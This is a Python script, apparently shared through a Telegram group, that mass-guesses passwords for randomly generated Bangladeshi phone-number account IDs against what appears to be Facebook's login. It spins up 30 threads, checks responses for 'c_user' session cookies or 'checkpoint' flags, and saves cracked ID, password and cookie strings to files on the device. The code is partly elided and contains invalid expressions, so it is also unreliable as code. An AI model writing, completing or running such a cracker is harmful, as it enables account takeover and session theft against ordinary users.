# RANDOM SCRIPT GIFT BY MR MOSABBIR
# UPDATE KORE NIBEN
# JOIN TELEGRAM GROUP : https://t.me/mosabbir-random_143
#------------------[ IMPORT ]------------------#
...
logo = f"""
{white}-----------------------------------------------
 {white}[{green}√{white}] CODE BY MR-MOSABBIR 
 {white}[{green}√{white}] RANDOM SCRIPT GIFT
{white}-----------------------------------------------"""
#------------------[ MAIN MENU ]------------------#
def MOSABBIR():
	clear();os.system('xdg-open https://t.me/mosabbir-random_143');print(f' {white}[{green}1{white}] START RANDOM CLONE ');print(f' {white}[{green}2{white}] EXIT CLONE ');linex();bal=input(f' {white}[{green}?{white}] SELECT : ')
	if bal in ['1']:___Bangladesh___()
	else:print(f' {white}[{green}√{white}] OPTION NOT FOUND BROH');exit()
#------------------[ RANDOM MENU ]------------------#
def ___Bangladesh___():
	clear();os.system('xdg-open https://t.me/mosabbir-random_143');print(f' {white}[{green}√{white}] CODE : 017 | 018 | 013 | 016 | 019 ');linex();code=input(f' {white}[{green}?{white}] SELECT : ')
	clear();os.system('xdg-open https://t.me/mosabbir-random_143');print(f' {white}[{green}√{white}] LIMIT : 2222 | 3333 | 4444 | 5555 | 9999 ');linex();limit=input(f' {white}[{green}?{white}] SELECT : ')
	for xxx in range(int(limit)):
		mrMOSABBIR = "".join(random.choice(string.digits) for _ in range(8))
		user.append(mrMOSABBIR)
	with habib(max_workers=30) as ___mrMOSABBIR___:
		...
		for love in user:
			...
			___mrMOSABBIR___.submit(_P_O_C_O_,ids,passlist)
    ...
    try:
        for pas in passlist:
            ...
            data = {
				...
				"jazoest": mosabbir-random.get('jazoest'),
				"lsd": mosabbir-random.get('lsd'),}
            headers = {
            ...
            if "c_user" in response.cookies.get_dict():
                ...
                if "Photoshop" in response:
                	print(f'\r\r {white}[{green}MOSABBIR-OK{white}]{green} '+uid+' | '+pas+'\033[1;97m')
                	#print(f'\r\r {white}[{green}COOKIES{white}]{white} '+cookies);linex()
                	open("/sdcard/MR-MOSABBIR-RANDOM-OK.txt","a").write(uid+"|"+pas+"|"+cookies+"\n")
                	oks.append(ids)
                	break
                else:continue
            elif 'checkpoint' in response.cookies.get_dict():
            	uid = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
            	#print(f'\r\r {white}[{rad}MOSABBIR-CP{white}]{rad} '+uid+' | '+pas+'\033[1;97m')
            	open('/sdcard/MR-MOSABBIR-RANDOM-CP','a').write(uid+'|'+pas+'\n')
            	cps.append(ids)
            	break
            else:continue
        loop+=1
